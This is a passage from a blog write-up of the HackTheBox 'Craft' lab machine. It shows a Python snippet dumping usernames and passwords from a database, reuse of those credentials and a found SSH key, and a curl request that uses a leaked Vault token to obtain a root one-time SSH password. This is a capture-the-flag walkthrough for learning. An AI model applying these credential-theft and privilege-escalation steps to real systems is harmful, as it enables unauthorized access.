</span><span>        sql = &quot;</span><span style="color:#b48ead;">SELECT </span><span>`</span><span style="color:#a3be8c;">id</span><span>`</span><span style="color:#a3be8c;">, </span><span>`</span><span style="color:#a3be8c;">username</span><span>`</span><span style="color:#a3be8c;">, </span><span>`</span><span style="color:#a3be8c;">password</span><span>` </span><span style="color:#b48ead;">FROM </span><span>`</span><span style="color:#a3be8c;">user</span><span>`&quot;
</span><span>        cursor.</span><span style="color:#bf616a;">execute</span><span>(sql)
</span><span>        result = cursor.</span><span style="color:#bf616a;">fetchmany</span><span>(</span><span style="color:#bf616a;">size</span><span>=</span><span style="color:#d08770;">10</span><span>)
</span><span>        </span><span style="color:#96b5b4;">print</span><span>(result)
</span><span>
</span><span style="color:#b48ead;">finally</span><span>:
</span><span>    connection.</span><span style="color:#bf616a;">close</span><span>()
</span></code></pre>
<p>Take note of the <code>cursor.fetchmany</code>. I got stuck on this as I forgot that it only retrieved one result at a time. Changing this piece of code will select all data from rows 1-10.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-dbexploitpy.png" alt="htb-craft-dbexploitpy.png" /></p>
<p>And there it is. I got new username and passwords from the SQL database, lets see if we can log into other services with them.</p>
</li>
<li>
<p>SSH doesn't work. SSH on port 6022 doesn't work either. <code>su</code> doesn't work either. Logging into Gogs using Gilfoyle's credentials worked! There appears to be a private repository.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-privaterepo.png" alt="htb-craft-privaterepo.png" /></p>
<p>The <code>.ssh</code> directory is our ticket in using SSH. Lets download the repository and unzip for the .ssh files.</p>
</li>
<li>
<p>Login using SSH using the same password as found above:</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">ssh -i</span><span> id_rsa gilfoyle@craft.htb
</span></code></pre>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-sshsuccess.png" alt="htb-craft-sshsuccess.png" /></p>
<p><code>Do not ever copy and paste SSH keys, they do not work. The MD5sum doesn't match with the original.</code>{:.warning}</p>
</li>
</ol>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<ol>
<li>
<p>Ran <code>linenum</code> and <code>linuxprivchecker</code> script and I didn't find anything out of the ordinary. Nothing in crontab. I started to poke around the home directory and there is a <code>.vault-token</code> file.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-vaulttoken.png" alt="htb-craft-vaulttoken.png" /></p>
<p>A quick Google search shows up as some sort of vault key for HashiCorp.  I see that you can run <code>vault</code> commands so I tried and see what options I had.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-vaultcmds.png" alt="htb-craft-vaultcmds.png" /></p>
<p>Poking around at what it does, I'm not entirely sure how it works.</p>
</li>
<li>
<p>I started to dig around the repository again because the pattern so far with this machine is all clues can be found in the repository. I found this script:</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-vaultsecrets.png" alt="htb-craft-vaultsecrets.png" /></p>
<p>A quick Google search reveals that these commands create a SSH session using a one-time password token.</p>
<p><a href="https://learn.hashicorp.com/vault/secrets-management/sm-ssh-otp">SSH Secrets Engine: OTP SSH Password</a></p>
</li>
<li>
<p>Let's first run the commands that we found in the script to enable SSH and allow OTP for root.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-ssh-otp.png" alt="htb-craft-ssh-otp.png" /></p>
</li>
<li>
<p>Next, we need to create a <code>cURL</code> PUT request to get a token generated.</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl --header </span><span>&quot;</span><span style="color:#a3be8c;">X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</span><span>&quot;</span><span style="color:#bf616a;"> --request</span><span> PUT</span><span style="color:#bf616a;"> --data </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;ip&quot;: &quot;127.0.0.1&quot;}</span><span>&#39; https://vault.craft.htb:8200/v1/ssh/creds/root_otp
</span></code></pre>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-curl-otp.png" alt="htb-craft-curl-otp.png" /></p>
</li>
<li>
<p>Copy the token and <code>ssh</code> using root.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-rooted.png" alt="htb-craft-rooted.png" /></p>
</li>
</ol>
</article>

  
    
  
  <ul class="tags">
    
      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
    
  </ul>
  
  
    
</section>
</article>
    <footer>
        <div class="social">
            <ul> 
                 
                <li>
                    <a href="https://github.com/jtuyen"
                       title="Github" rel="me"><i data-feather="github"></i></a>
                </li>
                 
                 
                <li>
                    <a href="https://twitter.com/jtuyen"
                       title="Twitter"
                       rel="me"><i data-feather="twitter"></i></a>
                </li>
                
                
                
                <li>
                    <a href="https://johntuyen.com/atom.xml"
                       title="John Tuyen"><i data-feather="rss"></i></a>
                </li>
            </ul>
        </div>
        <p> © John Tuyen 2024

        
        <br>Powered by <a target="_blank" href="https://getzola.org/">Zola</a>. Theme: <a target="_blank" href="https://github.com/jimmyff/zola-inky">Inky</a>.
        </p>
    </footer>
    <script>
        feather.replace();
    </script> 
    </body>
</html>